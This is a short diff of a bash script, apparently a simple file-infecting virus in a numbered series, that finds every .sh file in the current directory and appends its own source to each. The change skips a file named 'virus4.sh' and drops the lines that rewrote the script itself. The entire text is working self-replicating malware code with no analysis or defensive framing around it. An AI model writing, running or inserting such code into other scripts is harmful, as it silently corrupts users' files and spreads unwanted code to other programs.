@@ -3,11 +3,12 @@
 files=`ls *.sh`
 
 files=($(echo $files | tr " " "\n"))
-initial=`cat $0`
 
 for file in "${files[@]}"; do
+    if [[ $file != "virus4.sh" ]]; then
     echo -e "\n" >> "$file"
     cat $0 >> "$file"
+    fi
 done
 
-echo -e "\n$initial" > $0
+exit 0
